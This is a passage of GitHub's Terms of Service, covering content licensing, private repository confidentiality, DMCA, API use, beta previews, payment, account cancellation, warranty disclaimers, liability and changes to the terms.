If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If you’d like to use GitHub’s trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

By agreeing to these Terms, you are giving us permission to charge your on-file credit card, PayPal account, or other approved methods of payment for fees that you authorize for GitHub.

### [5. Responsibility for Payment](#5-responsibility-for-payment)

You are responsible for all fees, including taxes, associated with your use of the Service. By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service. If you dispute the matter, contact us through the [GitHub Support portal](https://support.github.com/). You are responsible for providing us with a valid means of payment for paid Accounts. Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

It is your responsibility to properly cancel your Account with GitHub. You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

GitHub has the right to suspend or terminate your access to all or any part of the Website at any time, with or without cause, with or without notice, effective immediately. GitHub reserves the right to refuse service to anyone for any reason at any time.

### [4. Survival](#4-survival)

All provisions of this Agreement which, by their nature, should survive termination *will* survive termination — including, without limitation: ownership provisions, warranty disclaimers, indemnity, and limitations of liability.

## [M. Communications with GitHub](#m-communications-with-github)

**Short version:** *We use email and other electronic means to stay in touch with our users.*

### [1. Electronic Communication Required](#1-electronic-communication-required)

For contractual purposes, you (1) consent to receive communications from us in an electronic form via the email address you have submitted or via the Service; and (2) agree that all Terms of Service, agreements, notices, disclosures, and other communications that we provide to you electronically satisfy any legal requirement that those communications would satisfy if they were on paper. This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation. Legal notice to GitHub must be in writing and [served on GitHub's legal agent](/en/site-policy/other-site-policies/guidelines-for-legal-requests-of-user-data#submitting-requests).

### [3. No Phone Support](#3-no-phone-support)

GitHub only offers support via email, in-Service communications, and electronic messages. We do not offer telephone support.

## [N. Disclaimer of Warranties](#n-disclaimer-of-warranties)

**Short version:** *We provide our service as is, and we make no promises or guarantees about this service. Please read this section carefully; you should understand what to expect.*

GitHub provides the Website and the Service “as is” and “as available,” without warranty of any kind. Without limiting this, we expressly disclaim all warranties, whether express, implied or statutory, regarding the Website and the Service including without limitation any warranty of merchantability, fitness for a particular purpose, title, security, accuracy and non-infringement.

GitHub does not warrant that the Service will meet your requirements; that the Service will be uninterrupted, timely, secure, or error-free; that the information provided through the Service is accurate, reliable or correct; that any defects or errors will be corrected; that the Service will be available at any particular time or location; or that the Service is free of viruses or other harmful components. You assume full responsibility and risk of loss resulting from your downloading and/or use of files, information, content or other material obtained from the Service.

## [O. Limitation of Liability](#o-limitation-of-liability)

**Short version:** *We will not be liable for damages or losses arising from your use or inability to use the service or otherwise arising under this agreement. Please read this section carefully; it limits our obligations to you.*

You understand and agree that we will not be liable to you or any third party for any loss of profits, use, goodwill, or data, or for any incidental, indirect, special, consequential or exemplary damages, however arising, that result from

* the use, disclosure, or display of your User-Generated Content;
* your use or inability to use the Service;

## [P. Release and Indemnification](#p-release-and-indemnification)

If you have a dispute with one or more Users, you agree to release GitHub from any and all claims, demands and damages (actual and consequential) of every kind and nature, known and unknown, arising out of or in any way connected with such disputes.

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

## [Q. Changes to These Terms](#q-changes-to-these-terms)

**Short version:** *We want our users to be informed of important changes to our terms, but some changes aren't that important — we don't want to bother you every time we fix a typo. So while we may modify this agreement at any time, we will notify users of any material changes and give you time to adjust to them.*

We reserve the right, at our sole discretion, to amend these Terms of Service at any time and will update these Terms of Service in the event of any such amendments. We will notify our Users of material changes to this Agreement, such as price increases, at least 30 days prior to the change taking effect by posting a notice on our Website or sending email to the primary email address specified in your GitHub account. Customer's continued use of the Service after those 30 days constitutes agreement to those revisions of this Agreement. For any other modifications, your continued use of the Website constitutes agreement to our revisions of these Terms of Service. You can view all changes to these Terms in our [Site Policy](https://github.com/github/site-policy) repository.

We reserve the right at any time and from time to time to modify or discontinue, temporarily or permanently, the Website (or any part of it) with or without notice.
